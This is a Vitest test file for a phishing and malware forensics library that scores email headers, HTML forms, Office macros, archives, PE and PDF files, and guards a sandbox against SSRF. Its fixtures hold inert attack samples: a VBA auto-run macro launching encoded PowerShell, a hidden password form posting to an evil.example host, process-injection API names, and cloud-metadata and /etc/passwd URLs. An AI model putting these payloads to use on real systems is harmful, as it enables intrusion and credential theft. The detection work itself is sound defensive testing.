import { describe, expect, it } from "vitest";
import { strToU8, zipSync } from "fflate";

import { analyzeHeaders } from "@/lib/forensics/headers";
import { analyzeBody } from "@/lib/forensics/body";
import { analyzeHtml } from "@/lib/forensics/html-intel";
import { analyzeFile, analyzePe, listZip, obfuscationScore, shannonEntropy, vbaSemantics } from "@/lib/forensics/files";
import { aggregateVerdict } from "@/lib/forensics/scoring";
import { extractUrls, registrableDomain, unwrapUrl } from "@/lib/forensics/urls";
import { detonateUrl } from "@/lib/forensics/sandbox";

process.env.FORENSICS_DNS_LOOKUPS = "false";

describe("URL handling", () => {
  it("unwraps Proofpoint v2/v3 and Safe Links", () => {
    expect(unwrapUrl("https://urldefense.com/v3/__https://evil.example/x__;!!abc")).toBe("https://evil.example/x");
    expect(unwrapUrl("https://urldefense.proofpoint.com/v2/url?u=https-3A__evil.example_path&d=x")).toBe("https://evil.example/path");
    expect(unwrapUrl("https://eur01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fevil.example%2Fa&data=1")).toBe("https://evil.example/a");
  });

  it("extracts hrefs and bare URLs, dropping schema noise", () => {
    const urls = extractUrls('<a href="https://a.example/x">x</a> see hxxp://b[.]example/y <html xmlns="http://www.w3.org/1999/xhtml">');
    expect(urls).toEqual(expect.arrayContaining(["https://a.example/x", "http://b.example/y"]));
    expect(urls.some((u) => u.includes("w3.org"))).toBe(false);
  });

  it("computes registrable domains including multi-part suffixes", () => {
    expect(registrableDomain("a.b.example.co.uk")).toBe("example.co.uk");
    expect(registrableDomain("login.microsoft.com")).toBe("microsoft.com");
  });
});

describe("header analysis", () => {
  const lines = [
    { key: "received", value: "from relay.bad.example ([185.220.101.45]) by mx.corp.example; Tue, 20 Oct 2026 08:00:00 +0000" },
    { key: "authentication-results", value: "mx.corp.example; spf=softfail smtp.mailfrom=bad.example; dkim=none; dmarc=fail (p=quarantine) header.from=paypal-billing.example" },
    { key: "from", value: '"PayPal" <service@paypal-billing.example>' },
    { key: "reply-to", value: "refunds@other.example" },
    { key: "return-path", value: "<bounce@bad.example>" },
  ];

  it("scores failed authentication and sender mismatches", async () => {
    const h = await analyzeHeaders(lines, "Account suspended - action required");
    expect(h.auth.spf.status).toBe("softfail");
    expect(h.auth.dmarc).toEqual({ status: "fail", details: "Policy: quarantine" });
    expect(h.senderIp).toBe("185.220.101.45");
    expect(h.reasons.join(" ")).toMatch(/Reply-To mismatch.*/);
    expect(h.reasons.join(" ")).toContain("Return-Path domain mismatch: bad.example vs paypal-billing.example");
    expect(h.score).toBe(25 + 40 + 15 + 20 + 15); // spf + dmarc + urgency + reply-to + return-path
  });

  it("passes clean mail", async () => {
    const h = await analyzeHeaders([{ key: "authentication-results", value: "x; spf=pass; dkim=pass; dmarc=pass" }, { key: "from", value: "a@corp.example" }], "Lunch?");
    expect(h.score).toBe(0);
  });
});

describe("body & HTML intelligence", () => {
  it("finds credential forms posting off-domain and hidden forms", () => {
    const intel = analyzeHtml('<form action="https://collect.evil.example/p" style="display: none"><input name="user"><input type="password" name="pw"></form>', "https://landing.example/login");
    expect(intel.passwordFields).toBe(1);
    expect(intel.forms[0]).toMatchObject({ targetType: "External", hidden: true, method: "GET" });
    expect(intel.score).toBeGreaterThanOrEqual(45);
  });

  it("treats same-site form actions as internal", () => {
    const intel = analyzeHtml('<form action="https://accounts.example.com/signin" method="post"><input type="password"></form>', "https://www.example.com/");
    expect(intel.forms[0].targetType).toBe("Internal");
  });

  it("flags look-alike brand domains but skips whitelisted ones", () => {
    const body = analyzeBody("Verify your account password at https://login-microsoft365.example.xyz/ or https://www.google.com/", undefined, ["google.com"]);
    expect(body.urls).toEqual(["https://login-microsoft365.example.xyz/"]);
    expect(body.whitelistedHits).toEqual(["google.com"]);
    expect(body.reasons.join(" ")).toContain("microsoft");
    expect(body.reasons.join(" ")).toContain(".xyz");
  });
});

describe("file forensics", () => {
  it("detects macro-enabled OOXML with auto-exec VBA keywords and external links", () => {
    const docm = zipSync({
      "[Content_Types].xml": strToU8("<Types/>"),
      "word/vbaProject.bin": strToU8('Sub AutoOpen()\nCreateObject("WScript.Shell").Run "powershell -enc AAAA"\nEnd Sub'),
      "word/_rels/document.xml.rels": strToU8('<Relationship Target="https://x.example.top/p" TargetMode="External"/>'),
    });
    const a = analyzeFile("invoice.docm", docm);
    expect(a.fileType).toBe("office (OOXML)");
    expect(a.signals).toMatchObject({ hasMacros: true, autoExec: true });
    expect(a.techniques).toEqual(expect.arrayContaining(["T1059.005", "T1204.002"]));
    expect(a.urls).toEqual(["https://x.example.top/p"]);
    expect(a.risk).toBe("Malicious");
  });

  it("flags macros inside a .docx that shouldn't carry them", () => {
    const docx = zipSync({ "[Content_Types].xml": strToU8("<Types/>"), "word/vbaProject.bin": strToU8("x") });
    expect(analyzeFile("report.docx", docx).reasons.join(" ")).toContain("shouldn't carry macros");
  });

  it("lists archives and flags executables, double extensions, and encrypted members", () => {
    const zip = zipSync({ "invoice.pdf.exe": new Uint8Array([0x4d, 0x5a, 0, 0]), "readme.txt": strToU8("hello") });
    // Flip the "encrypted" flag bit on the first central-directory entry.
    const view = new DataView(zip.buffer);
    for (let i = zip.length - 22; i >= 0; i--) {
      if (view.getUint32(i, true) === 0x06054b50) {
        const cd = view.getUint32(i + 16, true);
        view.setUint16(cd + 8, view.getUint16(cd + 8, true) | 1, true);
        break;
      }
    }
    const entries = listZip(zip);
    expect(entries.map((e) => [e.name, e.encrypted])).toEqual([["invoice.pdf.exe", true], ["readme.txt", false]]);
    const a = analyzeFile("docs.zip", zip);
    expect(a.signals.doubleExtension).toBe(true);
    expect(a.reasons.join(" ")).toContain("Password-protected");
  });

  it("parses PE headers, sections, and suspicious imports", () => {
    const pe = new Uint8Array(1024);
    const v = new DataView(pe.buffer);
    pe.set([0x4d, 0x5a]);
    v.setUint32(0x3c, 0x80, true);
    v.setUint32(0x80, 0x00004550, true);
    v.setUint16(0x84, 0x8664, true);
    v.setUint16(0x86, 1, true);
    v.setUint32(0x88, 1700000000, true);
    v.setUint16(0x94, 0, true); // no optional header → section table at 0x98
    pe.set(strToU8(".text"), 0x98);
    v.setUint32(0x98 + 16, 64, true);
    v.setUint32(0x98 + 20, 0x200, true);
    pe.set(strToU8("VirtualAllocEx\0WriteProcessMemory\0CreateRemoteThread\0"), 0x300);
    const info = analyzePe(pe)!;
    expect(info.machine).toBe("x64");
    expect(info.sections[0].name).toBe(".text");
    expect(info.suspiciousImports).toEqual(["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]);
    expect(analyzeFile("photo.jpg", pe).reasons.join(" ")).toContain("disguised");
  });

  it("detects PDF active content", () => {
    const pdf = strToU8("%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /JS (app.alert(1)) /URI (https://p.example/x) >> endobj\nstartxref");
    const a = analyzeFile("statement.pdf", pdf);
    expect(a.signals.hasJs).toBe(true);
    expect(a.urls).toEqual(["https://p.example/x"]);
  });

  it("scores script obfuscation and VBA intent", () => {
    expect(obfuscationScore(`eval(String.fromCharCode(${"65,".repeat(60)}65)); var b="${"A".repeat(100)}";`)).toBeGreaterThan(20);
    expect(vbaSemantics("Sub Workbook_Open()\nx = Environ(\"COMPUTERNAME\")\nEnd Sub")).toMatchObject({ autoExec: true, envFingerprinting: true });
    expect(shannonEntropy(new Uint8Array(256).map((_, i) => i))).toBeCloseTo(8);
  });
});

describe("verdict scoring", () => {
  it("uses desas thresholds and classifies the threat", () => {
    const v = aggregateVerdict([
      { component: "Header analysis", points: 40, reasons: ["DMARC validation failed — domain spoofing likely"] },
      { component: "Content analysis", points: 35, reasons: ["Form collects sensitive field 'password'"] },
    ]);
    expect(v.verdict).toBe("malicious");
    expect(v.threatType).toBe("Phishing");
    expect(v.threatCategory).toBe("Credential harvesting");
    expect(aggregateVerdict([{ component: "Content analysis", points: 31, reasons: ["x"] }]).verdict).toBe("suspicious");
    expect(aggregateVerdict([]).verdict).toBe("benign");
  });
});

describe("sandbox SSRF guard", () => {
  it("refuses internal and metadata addresses without making a request", async () => {
    for (const url of ["http://127.0.0.1/", "http://10.0.0.1/admin", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"]) {
      const r = await detonateUrl(url);
      expect(r.error, url).toBeDefined();
      expect(r.status).toBeUndefined();
    }
  });
});
